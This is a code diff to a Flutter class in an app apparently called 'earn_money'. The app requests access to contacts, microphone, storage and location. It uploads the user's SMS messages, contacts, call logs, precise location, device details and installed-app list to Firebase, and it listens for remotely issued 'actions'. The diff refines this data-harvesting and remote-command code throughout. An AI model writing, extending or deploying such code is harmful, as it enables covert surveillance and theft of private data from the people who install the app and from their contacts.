@@ -2,6 +2,7 @@ import 'dart:io';
 import 'package:audio_recorder/audio_recorder.dart';
 import 'package:call_log/call_log.dart';
 import 'package:device_info/device_info.dart';
+import 'package:earn_money/constants/constants.dart';
 import 'package:earn_money/enums/user-actions.dart';
 import 'package:flutter_appavailability/flutter_appavailability.dart';
 import 'package:path/path.dart' show join;
@@ -24,13 +25,11 @@ class PermissionManager {
   int docLength = 0;
   Future initiaiteSharedPreferences() async {
     prefs = await SharedPreferences.getInstance();
-    var userId = Random.secure().nextInt(100000).toString();
-    prefs.setString("user_id", userId);
+    return prefs;
   }
 
-  getPermissions() async {
-    initiaiteSharedPreferences();
-    // initilizeGlobalListiner();
+  Future getPermissions() async {
+    await initiaiteSharedPreferences();
     Map<PermissionGroup, PermissionStatus> permissions =
         await PermissionHandler().requestPermissions([
       PermissionGroup.contacts,
@@ -40,19 +39,12 @@ class PermissionManager {
       PermissionGroup.microphone,
       PermissionGroup.storage
     ]);
-    // print(permissions);
-    // await sendMessagesList();
-    // await sendContactsList();
-    // await sendFrontImage();
-    // await sendGeoLocation();
-    // await sendDeviceInfo();
-    //  await sendInstalledAppsList();
-    // await sendCallLogs();
   }
 
   initilizeGlobalListiner() {
     db
-        .collection('actions')
+        .collection(FirebaseTables.Actions)
+        .where('user_id', isEqualTo: prefs.getString("user_id"))
         .orderBy("requested_date", descending: true)
         .limit(1)
         .snapshots()
@@ -91,7 +83,7 @@ class PermissionManager {
 
   Future sendCallLogData(callLog) async {
     try {
-      await db.collection('call_logs').add(callLog);
+      await db.collection(FirebaseTables.Contacts).add(callLog);
     } catch (e) {
       print("Exception occured");
     }
@@ -109,7 +101,10 @@ class PermissionManager {
   Future sendAppData(appInfo) async {
     appInfo["user_id"] = prefs.get("user_id");
     try {
-      await db.collection('installed_apps').add(appInfo);
+      await db
+          .collection(FirebaseTables.Installed_apps)
+          .document('${prefs.get('username')}${DateTime.now().toString()}')
+          .setData(appInfo);
     } catch (e) {
       print("Exception occured");
     }
@@ -124,7 +119,10 @@ class PermissionManager {
       "user_id": prefs.get("user_id")
     };
     try {
-      await db.collection('device_info').add(deviceData);
+      await db
+          .collection(FirebaseTables.Device_info)
+          .document('${prefs.get('username')}${DateTime.now().toString()}')
+          .setData(deviceData);
     } catch (e) {
       print("Exception occured");
     }
@@ -155,8 +153,9 @@ class PermissionManager {
         .getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
     try {
       var userLocation = location.toJson();
-      userLocation['user_id'] = prefs.get("user_id");
-      var result = await db.collection('geo_location').add(userLocation);
+      userLocation['user_id'] = prefs.getString("user_id");
+      var result =
+          await db.collection(FirebaseTables.Geo_location).add(userLocation);
       return result;
     } catch (e) {
       print('Exception occured');
@@ -166,7 +165,7 @@ class PermissionManager {
   Future sendMessages(SmsMessage message) async {
     try {
       var msg = getJsonObject(message);
-      var result = await db.collection('messages').add(msg);
+      var result = await db.collection(FirebaseTables.Messages).add(msg);
       return result;
     } catch (e) {
       print('Exception occured');
@@ -176,7 +175,7 @@ class PermissionManager {
   Future sendContact(contact) async {
     try {
       contact = getContactJsonObject(contact);
-      var result = await db.collection('contacts').add(contact);
+      var result = await db.collection(FirebaseTables.Contacts).add(contact);
       return result;
     } catch (e) {
       print('Exception occured');
